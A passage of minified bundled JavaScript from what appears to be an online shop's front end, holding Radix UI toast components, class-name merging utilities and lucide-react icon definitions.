y=ou(r.current).includes(E.animationName);if(E.target===e&&y&&(c("ANIMATION_END"),!i.current)){const C=e.style.animationFillMode;e.style.animationFillMode="forwards",u=p.setTimeout(()=>{e.style.animationFillMode==="forwards"&&(e.style.animationFillMode=C)})}},h=E=>{E.target===e&&(s.current=ou(r.current))};return e.addEventListener("animationstart",h),e.addEventListener("animationcancel",f),e.addEventListener("animationend",f),()=>{p.clearTimeout(u),e.removeEventListener("animationstart",h),e.removeEventListener("animationcancel",f),e.removeEventListener("animationend",f)}}else c("ANIMATION_END")},[e,c]),{isPresent:["mounted","unmountSuspended"].includes(a),ref:v.useCallback(u=>{u&&(r.current=getComputedStyle(u)),n(u)},[])}}function ou(t){return(t==null?void 0:t.animationName)||"none"}function NA(t){var r,i;let e=(r=Object.getOwnPropertyDescriptor(t.props,"ref"))==null?void 0:r.get,n=e&&"isReactWarning"in e&&e.isReactWarning;return n?t.ref:(e=(i=Object.getOwnPropertyDescriptor(t,"ref"))==null?void 0:i.get,n=e&&"isReactWarning"in e&&e.isReactWarning,n?t.props.ref:t.props.ref||t.ref)}function Jo({prop:t,defaultProp:e,onChange:n=()=>{}}){const[r,i]=kA({defaultProp:e,onChange:n}),s=t!==void 0,o=s?t:r,a=sn(n),c=v.useCallback(u=>{if(s){const f=typeof u=="function"?u(t):u;f!==t&&a(f)}else i(u)},[s,t,i,a]);return[o,c]}function kA({defaultProp:t,onChange:e}){const n=v.useState(t),[r]=n,i=v.useRef(r),s=sn(e);return v.useEffect(()=>{i.current!==r&&(s(r),i.current=r)},[r,i,s]),n}var PA="VisuallyHidden",gh=v.forwardRef((t,e)=>d.jsx(pe.span,{...t,ref:e,style:{position:"absolute",border:0,width:1,height:1,padding:0,margin:-1,overflow:"hidden",clip:"rect(0, 0, 0, 0)",whiteSpace:"nowrap",wordWrap:"normal",...t.style}}));gh.displayName=PA;var RA=gh,pv="ToastProvider",[mv,AA,OA]=hv("Toast"),[US,Yz]=Xo("Toast",[OA]),[DA,vh]=US(pv),$S=t=>{const{__scopeToast:e,label:n="Notification",duration:r=5e3,swipeDirection:i="right",swipeThreshold:s=50,children:o}=t,[a,c]=v.useState(null),[u,p]=v.useState(0),f=v.useRef(!1),h=v.useRef(!1);return n.trim()||console.error(`Invalid prop \`label\` supplied to \`${pv}\`. Expected non-empty \`string\`.`),d.jsx(mv.Provider,{scope:e,children:d.jsx(DA,{scope:e,label:n,duration:r,swipeDirection:i,swipeThreshold:s,toastCount:u,viewport:a,onViewportChange:c,onToastAdd:v.useCallback(()=>p(E=>E+1),[]),onToastRemove:v.useCallback(()=>p(E=>E-1),[]),isFocusedToastEscapeKeyDownRef:f,isClosePausedRef:h,children:o})})};$S.displayName=pv;var zS="ToastViewport",jA=["F8"],xm="toast.viewportPause",Em="toast.viewportResume",BS=v.forwardRef((t,e)=>{const{__scopeToast:n,hotkey:r=jA,label:i="Notifications ({hotkey})",...s}=t,o=vh(zS,n),a=AA(n),c=v.useRef(null),u=v.useRef(null),p=v.useRef(null),f=v.useRef(null),h=We(e,f,o.onViewportChange),E=r.join("+").replace(/Key/g,"").replace(/Digit/g,""),_=o.toastCount>0;v.useEffect(()=>{const C=x=>{var S;r.length!==0&&r.every(N=>x[N]||x.code===N)&&((S=f.current)==null||S.focus())};return document.addEventListener("keydown",C),()=>document.removeEventListener("keydown",C)},[r]),v.useEffect(()=>{const C=c.current,x=f.current;if(_&&C&&x){const w=()=>{if(!o.isClosePausedRef.current){const j=new CustomEvent(xm);x.dispatchEvent(j),o.isClosePausedRef.current=!0}},S=()=>{if(o.isClosePausedRef.current){const j=new CustomEvent(Em);x.dispatchEvent(j),o.isClosePausedRef.current=!1}},N=j=>{!C.contains(j.relatedTarget)&&S()},R=()=>{C.contains(document.activeElement)||S()};return C.addEventListener("focusin",w),C.addEventListener("focusout",N),C.addEventListener("pointermove",w),C.addEventListener("pointerleave",R),window.addEventListener("blur",w),window.addEventListener("focus",S),()=>{C.removeEventListener("focusin",w),C.removeEventListener("focusout",N),C.removeEventListener("pointermove",w),C.removeEventListener("pointerleave",R),window.removeEventListener("blur",w),window.removeEventListener("focus",S)}}},[_,o.isClosePausedRef]);const y=v.useCallback(({tabbingDirection:C})=>{const w=a().map(S=>{const N=S.ref.current,R=[N,...qA(N)];return C==="forwards"?R:R.reverse()});return(C==="forwards"?w.reverse():w).flat()},[a]);return v.useEffect(()=>{const C=f.current;if(C){const x=w=>{var R,j,T;const S=w.altKey||w.ctrlKey||w.metaKey;if(w.key==="Tab"&&!S){const b=document.activeElement,P=w.shiftKey;if(w.target===C&&P){(R=u.current)==null||R.focus();return}const D=y({tabbingDirection:P?"backwards":"forwards"}),A=D.findIndex(V=>V===b);Yf(D.slice(A+1))?w.preventDefault():P?(j=u.current)==null||j.focus():(T=p.current)==null||T.focus()}};return C.addEventListener("keydown",x),()=>C.removeEventListener("keydown",x)}},[a,y]),d.jsxs(SA,{ref:c,role:"region","aria-label":i.replace("{hotkey}",E),tabIndex:-1,style:{pointerEvents:_?void 0:"none"},children:[_&&d.jsx(Cm,{ref:u,onFocusFromOutsideViewport:()=>{const C=y({tabbingDirection:"forwards"});Yf(C)}}),d.jsx(mv.Slot,{scope:n,children:d.jsx(pe.ol,{tabIndex:-1,...s,ref:h})}),_&&d.jsx(Cm,{ref:p,onFocusFromOutsideViewport:()=>{const C=y({tabbingDirection:"backwards"});Yf(C)}})]})});BS.displayName=zS;var VS="ToastFocusProxy",Cm=v.forwardRef((t,e)=>{const{__scopeToast:n,onFocusFromOutsideViewport:r,...i}=t,s=vh(VS,n);return d.jsx(gh,{"aria-hidden":!0,tabIndex:0,...i,ref:e,style:{position:"fixed"},onFocus:o=>{var u;const a=o.relatedTarget;!((u=s.viewport)!=null&&u.contains(a))&&r()}})});Cm.displayName=VS;var yh="Toast",MA="toast.swipeStart",LA="toast.swipeMove",FA="toast.swipeCancel",UA="toast.swipeEnd",HS=v.forwardRef((t,e)=>{const{forceMount:n,open:r,defaultOpen:i,onOpenChange:s,...o}=t,[a=!0,c]=Jo({prop:r,defaultProp:i,onChange:s});return d.jsx(qi,{present:n||a,children:d.jsx(BA,{open:a,...o,ref:e,onClose:()=>c(!1),onPause:sn(t.onPause),onResume:sn(t.onResume),onSwipeStart:ie(t.onSwipeStart,u=>{u.currentTarget.setAttribute("data-swipe","start")}),onSwipeMove:ie(t.onSwipeMove,u=>{const{x:p,y:f}=u.detail.delta;u.currentTarget.setAttribute("data-swipe","move"),u.currentTarget.style.setProperty("--radix-toast-swipe-move-x",`${p}px`),u.currentTarget.style.setProperty("--radix-toast-swipe-move-y",`${f}px`)}),onSwipeCancel:ie(t.onSwipeCancel,u=>{u.currentTarget.setAttribute("data-swipe","cancel"),u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),u.currentTarget.style.removeProperty("--radix-toast-swipe-end-x"),u.currentTarget.style.removeProperty("--radix-toast-swipe-end-y")}),onSwipeEnd:ie(t.onSwipeEnd,u=>{const{x:p,y:f}=u.detail.delta;u.currentTarget.setAttribute("data-swipe","end"),u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),u.currentTarget.style.setProperty("--radix-toast-swipe-end-x",`${p}px`),u.currentTarget.style.setProperty("--radix-toast-swipe-end-y",`${f}px`),c(!1)})})})});HS.displayName=yh;var[$A,zA]=US(yh,{onClose(){}}),BA=v.forwardRef((t,e)=>{const{__scopeToast:n,type:r="foreground",duration:i,open:s,onClose:o,onEscapeKeyDown:a,onPause:c,onResume:u,onSwipeStart:p,onSwipeMove:f,onSwipeCancel:h,onSwipeEnd:E,..._}=t,y=vh(yh,n),[C,x]=v.useState(null),w=We(e,V=>x(V)),S=v.useRef(null),N=v.useRef(null),R=i||y.duration,j=v.useRef(0),T=v.useRef(R),b=v.useRef(0),{onToastAdd:P,onToastRemove:k}=y,O=sn(()=>{var Z;(C==null?void 0:C.contains(document.activeElement))&&((Z=y.viewport)==null||Z.focus()),o()}),D=v.useCallback(V=>{!V||V===1/0||(window.clearTimeout(b.current),j.current=new Date().getTime(),b.current=window.setTimeout(O,V))},[O]);v.useEffect(()=>{const V=y.viewport;if(V){const Z=()=>{D(T.current),u==null||u()},q=()=>{const J=new Date().getTime()-j.current;T.current=T.current-J,window.clearTimeout(b.current),c==null||c()};return V.addEventListener(xm,q),V.addEventListener(Em,Z),()=>{V.removeEventListener(xm,q),V.removeEventListener(Em,Z)}}},[y.viewport,R,c,u,D]),v.useEffect(()=>{s&&!y.isClosePausedRef.current&&D(R)},[s,R,y.isClosePausedRef,D]),v.useEffect(()=>(P(),()=>k()),[P,k]);const A=v.useMemo(()=>C?XS(C):null,[C]);return y.viewport?d.jsxs(d.Fragment,{children:[A&&d.jsx(VA,{__scopeToast:n,role:"status","aria-live":r==="foreground"?"assertive":"polite","aria-atomic":!0,children:A}),d.jsx($A,{scope:n,onClose:O,children:ac.createPortal(d.jsx(mv.ItemSlot,{scope:n,children:d.jsx(CA,{asChild:!0,onEscapeKeyDown:ie(a,()=>{y.isFocusedToastEscapeKeyDownRef.current||O(),y.isFocusedToastEscapeKeyDownRef.current=!1}),children:d.jsx(pe.li,{role:"status","aria-live":"off","aria-atomic":!0,tabIndex:0,"data-state":s?"open":"closed","data-swipe-direction":y.swipeDirection,..._,ref:w,style:{userSelect:"none",touchAction:"none",...t.style},onKeyDown:ie(t.onKeyDown,V=>{V.key==="Escape"&&(a==null||a(V.nativeEvent),V.nativeEvent.defaultPrevented||(y.isFocusedToastEscapeKeyDownRef.current=!0,O()))}),onPointerDown:ie(t.onPointerDown,V=>{V.button===0&&(S.current={x:V.clientX,y:V.clientY})}),onPointerMove:ie(t.onPointerMove,V=>{if(!S.current)return;const Z=V.clientX-S.current.x,q=V.clientY-S.current.y,J=!!N.current,L=["left","right"].includes(y.swipeDirection),z=["left","up"].includes(y.swipeDirection)?Math.min:Math.max,Y=L?z(0,Z):0,K=L?0:z(0,q),Q=V.pointerType==="touch"?10:2,X={x:Y,y:K},Re={originalEvent:V,delta:X};J?(N.current=X,au(LA,f,Re,{discrete:!1})):G_(X,y.swipeDirection,Q)?(N.current=X,au(MA,p,Re,{discrete:!1}),V.target.setPointerCapture(V.pointerId)):(Math.abs(Z)>Q||Math.abs(q)>Q)&&(S.current=null)}),onPointerUp:ie(t.onPointerUp,V=>{const Z=N.current,q=V.target;if(q.hasPointerCapture(V.pointerId)&&q.releasePointerCapture(V.pointerId),N.current=null,S.current=null,Z){const J=V.currentTarget,L={originalEvent:V,delta:Z};G_(Z,y.swipeDirection,y.swipeThreshold)?au(UA,E,L,{discrete:!0}):au(FA,h,L,{discrete:!0}),J.addEventListener("click",z=>z.preventDefault(),{once:!0})}})})})}),y.viewport)})]}):null}),VA=t=>{const{__scopeToast:e,children:n,...r}=t,i=vh(yh,e),[s,o]=v.useState(!1),[a,c]=v.useState(!1);return KA(()=>o(!0)),v.useEffect(()=>{const u=window.setTimeout(()=>c(!0),1e3);return()=>window.clearTimeout(u)},[]),a?null:d.jsx(fv,{asChild:!0,children:d.jsx(gh,{...r,children:s&&d.jsxs(d.Fragment,{children:[i.label," ",n]})})})},HA="ToastTitle",WS=v.forwardRef((t,e)=>{const{__scopeToast:n,...r}=t;return d.jsx(pe.div,{...r,ref:e})});WS.displayName=HA;var WA="ToastDescription",KS=v.forwardRef((t,e)=>{const{__scopeToast:n,...r}=t;return d.jsx(pe.div,{...r,ref:e})});KS.displayName=WA;var GS="ToastAction",qS=v.forwardRef((t,e)=>{const{altText:n,...r}=t;return n.trim()?d.jsx(QS,{altText:n,asChild:!0,children:d.jsx(gv,{...r,ref:e})}):(console.error(`Invalid prop \`altText\` supplied to \`${GS}\`. Expected non-empty \`string\`.`),null)});qS.displayName=GS;var YS="ToastClose",gv=v.forwardRef((t,e)=>{const{__scopeToast:n,...r}=t,i=zA(YS,n);return d.jsx(QS,{asChild:!0,children:d.jsx(pe.button,{type:"button",...r,ref:e,onClick:ie(t.onClick,i.onClose)})})});gv.displayName=YS;var QS=v.forwardRef((t,e)=>{const{__scopeToast:n,altText:r,...i}=t;return d.jsx(pe.div,{"data-radix-toast-announce-exclude":"","data-radix-toast-announce-alt":r||void 0,...i,ref:e})});function XS(t){const e=[];return Array.from(t.childNodes).forEach(r=>{if(r.nodeType===r.TEXT_NODE&&r.textContent&&e.push(r.textContent),GA(r)){const i=r.ariaHidden||r.hidden||r.style.display==="none",s=r.dataset.radixToastAnnounceExclude==="";if(!i)if(s){const o=r.dataset.radixToastAnnounceAlt;o&&e.push(o)}else e.push(...XS(r))}}),e}function au(t,e,n,{discrete:r}){const i=n.originalEvent.currentTarget,s=new CustomEvent(t,{bubbles:!0,cancelable:!0,detail:n});e&&i.addEventListener(t,e,{once:!0}),r?jS(i,s):i.dispatchEvent(s)}var G_=(t,e,n=0)=>{const r=Math.abs(t.x),i=Math.abs(t.y),s=r>i;return e==="left"||e==="right"?s&&r>n:!s&&i>n};function KA(t=()=>{}){const e=sn(t);ji(()=>{let n=0,r=0;return n=window.requestAnimationFrame(()=>r=window.requestAnimationFrame(e)),()=>{window.cancelAnimationFrame(n),window.cancelAnimationFrame(r)}},[e])}function GA(t){return t.nodeType===t.ELEMENT_NODE}function qA(t){const e=[],n=document.createTreeWalker(t,NodeFilter.SHOW_ELEMENT,{acceptNode:r=>{const i=r.tagName==="INPUT"&&r.type==="hidden";return r.disabled||r.hidden||i?NodeFilter.FILTER_SKIP:r.tabIndex>=0?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_SKIP}});for(;n.nextNode();)e.push(n.currentNode);return e}function Yf(t){const e=document.activeElement;return t.some(n=>n===e?!0:(n.focus(),document.activeElement!==e))}var YA=$S,JS=BS,ZS=HS,e1=WS,t1=KS,n1=qS,r1=gv;function i1(t){var e,n,r="";if(typeof t=="string"||typeof t=="number")r+=t;else if(typeof t=="object")if(Array.isArray(t)){var i=t.length;for(e=0;e<i;e++)t[e]&&(n=i1(t[e]))&&(r&&(r+=" "),r+=n)}else for(n in t)t[n]&&(r&&(r+=" "),r+=n);return r}function s1(){for(var t,e,n=0,r="",i=arguments.length;n<i;n++)(t=arguments[n])&&(e=i1(t))&&(r&&(r+=" "),r+=e);return r}const q_=t=>typeof t=="boolean"?`${t}`:t===0?"0":t,Y_=s1,_h=(t,e)=>n=>{var r;if((e==null?void 0:e.variants)==null)return Y_(t,n==null?void 0:n.class,n==null?void 0:n.className);const{variants:i,defaultVariants:s}=e,o=Object.keys(i).map(u=>{const p=n==null?void 0:n[u],f=s==null?void 0:s[u];if(p===null)return null;const h=q_(p)||q_(f);return i[u][h]}),a=n&&Object.entries(n).reduce((u,p)=>{let[f,h]=p;return h===void 0||(u[f]=h),u},{}),c=e==null||(r=e.compoundVariants)===null||r===void 0?void 0:r.reduce((u,p)=>{let{class:f,className:h,...E}=p;return Object.entries(E).every(_=>{let[y,C]=_;return Array.isArray(C)?C.includes({...s,...a}[y]):{...s,...a}[y]===C})?[...u,f,h]:u},[]);return Y_(t,o,c,n==null?void 0:n.class,n==null?void 0:n.className)};/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const QA=t=>t.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase(),o1=(...t)=>t.filter((e,n,r)=>!!e&&e.trim()!==""&&r.indexOf(e)===n).join(" ").trim();/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */var XA={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const JA=v.forwardRef(({color:t="currentColor",size:e=24,strokeWidth:n=2,absoluteStrokeWidth:r,className:i="",children:s,iconNode:o,...a},c)=>v.createElement("svg",{ref:c,...XA,width:e,height:e,stroke:t,strokeWidth:r?Number(n)*24/Number(e):n,className:o1("lucide",i),...a},[...o.map(([u,p])=>v.createElement(u,p)),...Array.isArray(s)?s:[s]]));/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const St=(t,e)=>{const n=v.forwardRef(({className:r,...i},s)=>v.createElement(JA,{ref:s,iconNode:e,className:o1(`lucide-${QA(t)}`,r),...i}));return n.displayName=`${t}`,n};/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const a1=St("ArrowRight",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"m12 5 7 7-7 7",key:"xquz4c"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const l1=St("Check",[["path",{d:"M20 6 9 17l-5-5",key:"1gmf2c"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ZA=St("Facebook",[["path",{d:"M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z",key:"1jg4f8"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const e2=St("Instagram",[["rect",{width:"20",height:"20",x:"2",y:"2",rx:"5",ry:"5",key:"2e1cvw"}],["path",{d:"M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z",key:"9exkf1"}],["line",{x1:"17.5",x2:"17.51",y1:"6.5",y2:"6.5",key:"r4j83e"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const t2=St("Menu",[["line",{x1:"4",x2:"20",y1:"12",y2:"12",key:"1e0a9i"}],["line",{x1:"4",x2:"20",y1:"6",y2:"6",key:"1owob3"}],["line",{x1:"4",x2:"20",y1:"18",y2:"18",key:"yk5zj1"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const vv=St("Minus",[["path",{d:"M5 12h14",key:"1ays0h"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const yv=St("Plus",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"M12 5v14",key:"s699le"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Q_=St("RefreshCcw",[["path",{d:"M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8",key:"14sxne"}],["path",{d:"M3 3v5h5",key:"1xhq8a"}],["path",{d:"M3 12a9 9 0 0 0 9 9 9.75 9.75 0 0 0 6.74-2.74L21 16",key:"1hlbsb"}],["path",{d:"M16 16h5v5",key:"ccwih5"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const c1=St("Search",[["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}],["path",{d:"m21 21-4.3-4.3",key:"1qie3q"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Dl=St("ShoppingBag",[["path",{d:"M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z",key:"hou9p0"}],["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M16 10a4 4 0 0 1-8 0",key:"1ltviw"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const u1=St("ShoppingCart",[["circle",{cx:"8",cy:"21",r:"1",key:"jimo8o"}],["circle",{cx:"19",cy:"21",r:"1",key:"13723u"}],["path",{d:"M2.05 2.05h2l2.66 12.42a2 2 0 0 0 2 1.58h9.78a2 2 0 0 0 1.95-1.57l1.65-7.43H5.12",key:"9zh506"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const n2=St("SlidersHorizontal",[["line",{x1:"21",x2:"14",y1:"4",y2:"4",key:"obuewd"}],["line",{x1:"10",x2:"3",y1:"4",y2:"4",key:"1q6298"}],["line",{x1:"21",x2:"12",y1:"12",y2:"12",key:"1iu8h1"}],["line",{x1:"8",x2:"3",y1:"12",y2:"12",key:"ntss68"}],["line",{x1:"21",x2:"16",y1:"20",y2:"20",key:"14d8ph"}],["line",{x1:"12",x2:"3",y1:"20",y2:"20",key:"m0wm8r"}],["line",{x1:"14",x2:"14",y1:"2",y2:"6",key:"14e1ph"}],["line",{x1:"8",x2:"8",y1:"10",y2:"14",key:"1i6ji0"}],["line",{x1:"16",x2:"16",y1:"18",y2:"22",key:"1lctlv"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Sm=St("Trash2",[["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6",key:"4alrt4"}],["path",{d:"M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2",key:"v07s0e"}],["line",{x1:"10",x2:"10",y1:"11",y2:"17",key:"1uufr5"}],["line",{x1:"14",x2:"14",y1:"11",y2:"17",key:"xtxkd"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const r2=St("Twitter",[["path",{d:"M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z",key:"pff0z6"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const i2=St("User",[["path",{d:"M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",key:"975kel"}],["circle",{cx:"12",cy:"7",r:"4",key:"17ys0d"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const lc=St("X",[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]]),_v="-",s2=t=>{const e=a2(t),{conflictingClassGroups:n,conflictingClassGroupModifiers:r}=t;return{getClassGroupId:o=>{const a=o.split(_v);return a[0]===""&&a.length!==1&&a.shift(),d1(a,e)||o2(o)},getConflictingClassGroupIds:(o,a)=>{const c=n[o]||[];return a&&r[o]?[...c,...r[o]]:c}}},d1=(t,e)=>{var o;if(t.length===0)return e.classGroupId;const n=t[0],r=e.nextPart.get(n),i=r?d1(t.slice(1),r):void 0;if(i)return i;if(e.validators.length===0)return;const s=t.join(_v);return(o=e.validators.find(({validator:a})=>a(s)))==null?void 0:o.classGroupId},X_=/^\[(.+)\]$/,o2=t=>{if(X_.test(t)){const e=X_.exec(t)[1],n=e==null?void 0:e.substring(0,e.indexOf(":"));if(n)return"arbitrary.."+n}},a2=t=>{const{theme:e,prefix:n}=t,r={nextPart:new Map,validators:[]};return c2(Object.entries(t.classGroups),n).forEach(([s,o])=>{bm(o,r,s,e)}),r},bm=(t,e,n,r)=>{t.forEach(i=>{if(typeof i=="string"){const s=i===""?e:J_(e,i);s.classGroupId=n;return}if(typeof i=="function"){if(l2(i)){bm(i(r),e,n,r);return}e.validators.push({validator:i,classGroupId:n});return}Object.entries(i).forEach(([s,o])=>{bm(o,J_(e,s),n,r)})})},J_=(t,e)=>{let n=t;return e.split(_v).forEach(r=>{n.nextPart.has(r)||n.nextPart.set(r,{nextPart:new Map,validators:[]}),n=n.nextPart.get(r)}),n},l2=t=>t.isThemeGetter,c2=(t,e)=>e?t.map(([n,r])=>{const i=r.map(s=>typeof s=="string"?e+s:typeof s=="object"?Object.fromEntries(Object.entries(s).map(([o,a])=>[e+o,a])):s);return[n,i]}):t,u2=t=>{if(t<1)return{get:()=>{},set:()=>{}};let e=0,n=new Map,r=new Map;const i=(s,o)=>{n.set(s,o),e++,e>t&&(e=0,r=n,n=new Map)};return{get(s){let o=n.get(s);if(o!==void 0)return o;if((o=r.get(s))!==void 0)return i(s,o),o},set(s,o){n.has(s)?n.set(s,o):i(s,o)}}},h1="!",d2=t=>{const{separator:e,experimentalParseClassName:n}=t,r=e.length===1,i=e[0],s=e.length,o=a=>{const c=[];let u=0,p=0,f;for(let C=0;C<a.length;C++){let x=a[C];if(u===0){if(x===i&&(r||a.slice(C,C+s)===e)){c.push(a.slice(p,C)),p=C+s;continue}if(x==="/"){f=C;continue}}x==="["?u++:x==="]"&&u--}const h=c.length===0?a:a.substring(p),E=h.startsWith(h1),_=E?h.substring(1):h,y=f&&f>p?f-p:void 0;return{modifiers:c,hasImportantModifier:E,baseClassName:_,maybePostfixModifierPosition:y}};return n?a=>n({className:a,parseClassName:o}):o},h2=t=>{if(t.length<=1)return t;const e=[];let n=[];return t.forEach(r=>{r[0]==="["?(e.push(...n.sort(),r),n=[]):n.push(r)}),e.push(...n.sort()),e},f2=t=>({cache:u2(t.cacheSize),parseClassName:d2(t),...s2(t)}),p2=/\s+/,m2=(t,e)=>{const{parseClassName:n,getClassGroupId:r,getConflictingClassGroupIds:i}=e,s=[],o=t.trim().split(p2);let a="";for(let c=o.length-1;c>=0;c-=1){const u=o[c],{modifiers:p,hasImportantModifier:f,baseClassName:h,maybePostfixModifierPosition:E}=n(u);let _=!!E,y=r(_?h.substring(0,E):h);if(!y){if(!_){a=u+(a.length>0?" "+a:a);continue}if(y=r(h),!y){a=u+(a.length>0?" "+a:a);continue}_=!1}const C=h2(p).join(":"),x=f?C+h1:C,w=x+y;if(s.includes(w))continue;s.push(w);const S=i(y,_);for(let N=0;N<S.length;++N){const R=S[N];s.push(x+R)}a=u+(a.length>0?" "+a:a)}return a};function g2(){let t=0,e,n,r="";for(;t<arguments.length;)(e=arguments[t++])&&(n=f1(e))&&(r&&(r+=" "),r+=n);return r}const f1=t=>{if(typeof t=="string")return t;let e,n="";for(let r=0;r<t.length;r++)t[r]&&(e=f1(t[r]))&&(n&&(n+=" "),n+=e);return n};function v2(t,...e){let n,r,i,s=o;function o(c){const u=e.reduce((p,f)=>f(p),t());return n=f2(u),r=n.cache.get,i=n.cache.set,s=a,a(c)}function a(c){const u=r(c);if(u)return u;const p=m2(c,n);return i(c,p),p}return function(){return s(g2.apply(null,arguments))}}const Oe=t=>{const e=n=>n[t]||[];return e.isThemeGetter=!0,e},p1=/^\[(?:([a-z-]+):)?(.+)\]$/i,y2=/^\d+\/\d+$/,_2=new Set(["px","full","screen"]),w2=/^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,x2=/\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,E2=/^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/,C2=/^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,S2=/^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/,pr=t=>po(t)||_2.has(t)||y2.test(t),qr=t=>Zo(t,"length",A2),po=t=>!!t&&!Number.isNaN(Number(t)),Qf=t=>Zo(t,"number",po),$a=t=>!!t&&Number.isInteger(Number(t)),b2=t=>t.endsWith("%")&&po(t.slice(0,-1)),re=t=>p1.test(t),Yr=t=>w2.test(t),T2=new Set(["length","size","percentage"]),I2=t=>Zo(t,T2,m1),N2=t=>Zo(t,"position",m1),k2=new Set(["image","url"]),P2=t=>Zo(t,k2,D2),R2=t=>Zo(t,"",O2),za=()=>!0,Zo=(t,e,n)=>{const r=p1.exec(t);return r?r[1]?typeof e=="string"?r[1]===e:e.has(r[1]):n(r[2]):!1},A2=t=>x2.test(t)&&!E2.test(t),m1=()=>!1,O2=t=>C2.test(t),D2=t=>S2.test(t),j2=()=>{const 